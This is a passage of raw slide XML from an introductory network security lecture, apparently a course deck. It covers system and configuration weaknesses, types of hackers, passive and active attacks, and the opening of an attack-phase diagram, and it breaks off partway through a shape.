            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="438840" indent="-319680">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings 2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Operating system weakness</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Each operating system has security problems that must be addressed.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>UNIX, Linux, Mac OS, Mac OS X, Windows NT, 9x, 2K, XP, and Vista.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>They are documented in the Computer Emergency Response Team (CERT) archives at  http://www.cert.org.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="438840" indent="-319680">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings 2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Network equipment weakness</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Various type of network equipment, such as routers, firewalls, and switches have security weaknesses that must be recognized and protected against. Their weaknesses include password protection, lack of authentication, routing protocols, and firewall holes.</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Configuration Weakness</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305"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Unsecured user accounts</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System accounts with easily guessed passwords</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Misconfigured Internet services</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Unsecured default settings within products</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Misconfigured network equipment</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Security Policy Weaknesses</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30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Lack of written security policy</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Software and hardware installation and changes do not follow policy</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Disaster recovery plan is nonexistent</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Types of Hackers</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30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1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Black hats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Individuals with extraordinary computing skills, resorting to malicious or destructive activities.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Known as ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Crackers</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>.’</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>White Hats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Individuals professing hacker skills and using them for defensive purposes.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 </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Known as ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Security Analysts</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>’.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Gray Hats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Individuals who work both offensively and defensively at various times.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </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Types of Hackers</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31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1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Script kiddy </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A user who lacks the skills of a typical hacker. Rather, he downloads hacking utilities and uses those utilities to launch attacks, rather than writing his own programs.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Hacktivist</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A hacker with political motivations, such as someone who defaces the website of a political candidate.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Phreaker</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A phreaker is a hacker of a telecommunications system. </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Categories of Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31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1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Passive Attack </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Difficult to detect, because the attacker isn’t actively sending traffic (malicious or otherwise)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Example: An attacker capturing packets from the network and attempting to decrypt them</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Active Attack </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Easier to detect, because the attacker is actively sending traffic that can be detected. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>An attacker might launch an active attack in an attempt to access classified information or to modify data on a system.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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The Increasing Threat of Attackers</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="315" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1676520"/>
            <a:ext cx="3580560" cy="2440800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="316" name="Picture 3" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4876920" y="1905120"/>
            <a:ext cx="3295080" cy="2685240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="317" name="CustomShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295280" y="4343400"/>
            <a:ext cx="1447200" cy="364320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="936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Past</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="318" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5718960" y="4354560"/>
            <a:ext cx="1447200" cy="364320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="936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Now</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What Does a Malicious Hacker Do?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="320" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990720" y="1752480"/>
            <a:ext cx="7695360" cy="4647600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3276720" y="1983600"/>
            <a:ext cx="2361600" cy="866520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="ffffff">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="111240" rIns="68760" tIns="111240" bIns="110880" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ffffff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2543760" y="2666520"/>
            <a:ext cx="3464640" cy="3464640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2609259" h="1732768">
                <a:moveTo>
                  <a:pt x="2609259" y="238027"/>
                </a:moveTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4f81bd">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="arrow" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5438520" y="3180960"/>
            <a:ext cx="1333440" cy="866520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="ffffff">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="111240" rIns="68760" tIns="111240" bIns="110880" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ffffff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Scanning</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="CustomShape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2724840" y="2417040"/>
            <a:ext cx="3464640" cy="3464640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3461387" h="1852624">
                <a:moveTo>
                  <a:pt x="3461387" y="1852625"/>
                </a:moveTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4f81bd">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="arrow" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325" name="CustomShape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4809240" y="5118120"/>
            <a:ext cx="1333440" cy="866520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="ffffff">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="111240" rIns="68760" tIns="111240" bIns="110880" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ffffff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Gaining access</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="326" name="CustomShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2724840" y="2417040"/>
            <a:ext cx="3464640" cy="3464640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1962343" h="3450261">
                <a:moveTo>
                  <a:pt x="1962343" y="3450262"/>
                </a:moveTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4f81bd">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="arrow" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="327" name="CustomShape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2687400" y="5118120"/>
            <a:ext cx="1579320" cy="866520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="ffffff">
